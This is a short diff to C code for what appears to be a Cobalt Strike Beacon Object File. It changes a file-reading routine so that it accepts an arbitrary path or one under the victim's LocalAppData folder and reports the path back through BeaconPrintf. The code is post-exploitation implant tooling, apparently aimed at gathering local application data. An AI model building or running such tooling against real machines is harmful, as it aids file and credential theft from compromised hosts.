@@ -91,18 +91,24 @@ FARPROC Resolver(CHAR *lib, CHAR *func) {
 }
 
 CHAR *GetFileContent(CHAR *path) {
-    CHAR appdata[MAX_PATH];
+    CHAR fullPath[MAX_PATH];
     HANDLE hFile = NULL;
     IMPORT_RESOLVE;
 
     //get appdata local path and append path 
-    SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata);
-    PathAppend(appdata, path);
-
-    BeaconPrintf(CALLBACK_OUTPUT, "LOOKING FOR FILE: %s \n", appdata);
+    if (path[0] == '\\') {
+        BeaconPrintf(CALLBACK_OUTPUT,"Appending local app data path\n");
+        CHAR appdata[MAX_PATH];
+        SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata);
+        PathAppend(appdata, path);
+        MSVCRT$strncpy(fullPath, appdata, MAX_PATH);
+    } else {
+        MSVCRT$strncpy(fullPath, path, MAX_PATH);
+    }
+    BeaconPrintf(CALLBACK_OUTPUT, "LOOKING FOR FILE: %s \n", fullPath);
     
     //get handle to appdata
-    hFile = KERNEL32$CreateFileA(appdata, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    hFile = KERNEL32$CreateFileA(fullPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if(hFile == INVALID_HANDLE_VALUE) {
         return NULL;
     }
